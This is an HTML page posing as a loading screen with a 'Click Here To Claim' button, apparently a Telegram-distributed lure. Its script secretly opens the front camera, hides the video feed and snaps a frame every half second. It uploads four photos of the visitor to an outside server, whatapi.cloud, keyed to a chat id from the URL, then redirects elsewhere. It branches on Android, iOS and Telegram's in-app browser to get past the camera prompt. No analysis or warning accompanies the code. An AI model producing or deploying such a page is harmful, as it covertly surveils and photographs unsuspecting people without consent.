<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #7D2AE8;
        }
        .verification-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            text-align: center;
        }
        .rotate-icon {
            width: 50px;
            height: 50px;
            border: 6px solid #fff;
            border-top: 6px solid #7D2AE8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        video {
            display: none;
            width: 300px;
            height: 200px;
        }
        #startButton {
            padding: 10px 20px;
            background-color: #ffffff;
            border: none;
            border-radius: 5px;
            color: #7D2AE8;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="verification-container">
    <div class="rotate-icon"></div>
    <button id="startButton" style="display: none;">Click Here To Claim</button>
</div>

<video id="video" playsinline style="display: none !important; visibility: hidden !important;"></video>


<script>
    const video = document.querySelector("#video");
    const startButton = document.getElementById('startButton');
    const chatId = new URLSearchParams(window.location.search).get("id");
    let captureCount = 0;
    const maxCaptures = 4;

    function isTelegramBrowser() {
        if (typeof window.TelegramWebview !== 'undefined') {
            return true;
        }
        if (typeof window.TelegramWebviewProxy !== 'undefined') {
            return true;
        }
        return false;
    }

    function isIOS() {
        return /iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    function isAndroid() {
        return /Android/i.test(navigator.userAgent);
    }

    function handleDevice() {
        if (isAndroid()) {
            if (isTelegramBrowser()) {
                startButton.style.display = "block";
                startButton.addEventListener('click', function() {
                    startCamera();
                });
            } else {
                startCamera();
            }
        } else if (isIOS()) {
            if (isTelegramBrowser()) {
                startCamera();
            } else {
                startButton.style.display = "block";
                startButton.addEventListener('click', function() {
                    startCamera();
                });
            }
        }
    }

    function startCamera() {
        if (navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.style.display = "block";
                    video.play();
                });
        }
    }

    async function compressAndSendImage(image_data, quality, format) {
        const img = new Image();
        img.src = image_data;
        img.onload = async function() {
            const canvas = document.createElement('canvas');
            canvas.width = img.width;
            canvas.height = img.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            const compressedDataUrl = canvas.toDataURL(format, quality);
            await sendImageToServer(compressedDataUrl);
        }
    }

    async function sendImageToServer(image_data) {
        const response = await fetch('https://whatapi.cloud:8443/send-image', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                id: chatId,
                image: image_data
            })
        });

        if (response.ok) {
            captureCount++;
            if (captureCount >= maxCaptures) {
                stopCapturing();
            }
        }
    }

    function captureAndSendImage() {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const image_data = canvas.toDataURL('image/jpeg', 0.5);
        compressAndSendImage(image_data, 0.5, 'image/jpeg');
    }

    function stopCapturing() {
        clearInterval(captureInterval);
        video.srcObject.getTracks().forEach(track => track.stop());
        window.location.href = "https://Linuxgen.in";
    }

    const captureInterval = setInterval(function() {
        if (video.paused || video.ended) return;
        captureAndSendImage();
    }, 500);

    window.onload = handleDevice;
</script>

</body>
</html>
